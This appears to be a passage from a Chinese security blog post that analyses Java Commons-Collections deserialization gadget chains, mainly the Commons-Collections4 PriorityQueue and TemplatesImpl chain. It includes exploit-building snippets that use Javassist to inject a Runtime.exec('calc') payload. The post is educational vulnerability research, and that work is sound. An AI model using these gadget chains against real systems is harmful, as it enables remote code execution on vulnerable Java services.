+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>   反序列化利用点是使用<code>LazyMap</code>在获取key值的时候，使其key不存在，然后再获取key的时候触发漏洞。但需要有一个入口，这里的反序列化触发的入口是JDK自带的<code>BadAttributeValueExpException</code>类。有几个点不得不服大佬们的厉害之处，第一点是找到反序列化的入口<code>BadAttributeValueExpException</code>，这个类得满足反序列化的基本条件，还得是JDK自带或者是组件自带的。第二点是使用<code>LazyMap</code>的key为空来触发反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518105354743.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons-Collections4"></a>Commons-Collections4</h1><p> 先看一下Gadget链，入口是JDK自带的<code>PriorityQueue.readObject()</code>。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></tbody></table></figure>
+<p>   断点撸码，断点的位置对于新手可能有点不知道该从何下手，其实掌握一点，看入口，反序列化的入口。<code>Commons-Collections4</code>这里的入口时<code>PriorityQueue.readObject()</code>方法，这时你可以双击<code>Shift</code>，找到该类在readObject下断点。<br><img src="https://img-blog.csdnimg.cn/20200518164944907.png" alt="在这里插入图片描述"><br>   去掉注释，也就省这么几行代码。自己结合官方文档分析一下就知道该断在哪里，如果你在知道具体步骤，你可以将每一行都设置个断点进行分析。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>{</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        s.readInt();</span><br><span class="line">        queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line">        heapify();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞触发流程-1"><a href="#漏洞触发流程-1" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><ol>
+<li>从ObjectInputStream.readObject()-&gt;PriorityQueue.readObject()-&gt;heapify()方法<br><img src="https://img-blog.csdnimg.cn/2020051816535565.png" alt="在这里插入图片描述"></li>
+<li>接着会执行heapify()-&gt;sifrDown()<br><img src="https://img-blog.csdnimg.cn/20200518165629497.png" alt="在这里插入图片描述"></li>
+<li>sifrDown()-&gt;comparator不为空进入siftDownUsingComparator()方法<br><img src="https://img-blog.csdnimg.cn/2020051816581125.png" alt="在这里插入图片描述"></li>
+<li>if判断是否&lt;=0是触发漏洞<br><img src="https://img-blog.csdnimg.cn/20200518165904692.png" alt="在这里插入图片描述"></li>
+<li>compare方法会执行transformer的transform方法，而transform通过反射机制被修改过，最后会导致反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518170453617.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200519095242678.png" alt="在这里插入图片描述"></li>
+</ol>
+<hr>
+<h3 id="漏洞成因分析-1"><a href="#漏洞成因分析-1" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java" target="_blank" rel="noopener">完整的实验代码地址https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java</a><br>   Javaassist被广泛用于修改字节码的工具包，而此gadget chain中使用修改字节码的形式触发漏洞。一个 CtClass (编译时类）对象可以处理一个 class 文件，ClassPool 是 CtClass 对象的容器。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认系统类搜索路径</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 添加额外的类搜索路径</span></span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Payload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">      <span class="comment">// 获取我们恶意payload的对象</span></span><br><span class="line">      <span class="keyword">final</span> CtClass clazz = pool.get(Payload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br></pre></td></tr></tbody></table></figure>
+<p>   修改好字节码后，在通过一系列的反射方法，将构造好的字节加入<code>tamplates</code>中，在反序列化的过程触发漏洞。反射这里就不过多的解释，如果不懂可以看笔者往期的博文。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// 静态初始化时插入执行命令的字节码</span></span><br><span class="line">      String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">      clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// 将初始化后的类设置新的名字</span></span><br><span class="line">      clazz.setName(<span class="string">"Summer"</span> + System.nanoTime());</span><br><span class="line">      <span class="comment">// 设置父类为AbstractTranslet</span></span><br><span class="line">      CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">      clazz.setSuperclass(superC);</span><br><span class="line"><span class="comment">// 获取修改后的字节码</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br></pre></td></tr></tbody></table></figure>
+<p>   其实将第二个占位只要是Object的类型对象就可以，比例可以是<code>tpl.newInstace()</code></p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里queue要占两个位，比较方法是要两个才能比较</span></span><br><span class="line">      <span class="comment">// 两个位的都要是一个类型，这里都是Object</span></span><br><span class="line">      queue.add(templates);</span><br><span class="line">      queue.add(<span class="keyword">new</span> VerifyError(<span class="string">"Summer"</span>));</span><br></pre></td></tr></tbody></table></figure>
+<p>  修改字节码之后我们再看看<code>newTransformer()</code>–&gt;<code>TemplatesImpl.getTransletInstance()</code> 方法。<br><img src="https://img-blog.csdnimg.cn/20200520141806664.png" alt="在这里插入图片描述"><br>   <code>getTransletInstance()</code>–&gt;<code>defineTransletClasses()</code>，这里会返回一个定义主类的类对象的引用。<br><img src="https://img-blog.csdnimg.cn/20200520142312443.png" alt="在这里插入图片描述"><br>   最后在这里的强制类型转化触发漏洞，到达执行命令的效果。<br><img src="https://img-blog.csdnimg.cn/20200520142424728.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200520142558464.gif" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>   <code>PriorityQueue</code>原本只是个优先队列，<code>TemplatesImpl</code>原本只是在xalan中的处理xml的模板实现，但是经过大佬之手二者结合产生巨大效果。吾不敢不服，下面只想用一图展现笔者对此gadget的思考。<br><img src="https://img-blog.csdnimg.cn/20200520144825335.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>   看完其实不难发现，Java反序列化漏洞必然离不开Java的反射机制的作用。这种都是底层的Java语言的开发者所想到便于开发的机制，下图是oracle官方给出的图例，笔者觉得如果想要打开一个新方向必然会用到一种“新”机制，这种机制应该还是开发人员经常使用的。<br><img src="https://img-blog.csdnimg.cn/20200520151819350.png" alt="在这里插入图片描述"><br>   一个新的Gadget的产生构造笔者有几点愚见，如有错误还望海涵。</p>
+<ol>
+<li>一个JDK自带的实现<code>Serializabe</code>接口</li>
+<li>必然离不开Java反射机制</li>
+<li>readObject()方法</li>
+</ol>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tool.oschina.net/apidocs/apidoc?api=commons-collections" target="_blank" rel="noopener">https://tool.oschina.net/apidocs/apidoc?api=commons-collections</a><br><a href="https://paper.seebug.org/1195/" target="_blank" rel="noopener">https://paper.seebug.org/1195/</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://xz.aliyun.com/t/7031#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-5</a><br><a href="https://blog.csdn.net/chenwan8737/article/details/100716015" target="_blank" rel="noopener">https://blog.csdn.net/chenwan8737/article/details/100716015</a><br><a href="https://blog.csdn.net/weixin_33802505/article/details/92214760" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33802505/article/details/92214760</a><br><a href="https://blog.csdn.net/21aspnet/article/details/81671777" target="_blank" rel="noopener">https://blog.csdn.net/21aspnet/article/details/81671777</a><br><a href="https://xalan.apache.org/xalan-j/apidocs/index.html" target="_blank" rel="noopener">https://xalan.apache.org/xalan-j/apidocs/index.html</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">SummerSec</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">SummerSec</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Java-Commons-Collections/">
+                                    <span class="chip bg-color">Java Commons-Collections</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/18.jpg" class="responsive-img" alt="Java反序列化链回显解决方案">
+                        
+                        <span class="card-title">Java反序列化链回显解决方案</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">Java 反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/16.jpg" class="responsive-img" alt="漫谈Java反序列化">
+                        
+                        <span class="card-title">漫谈Java反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.5'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2018-2021</span>
+            
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">SummerSec</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">112k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2018";
+                    var startMonth = "6";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/SummerSec" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:summersec@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/SecSummers" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/SecSummers" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
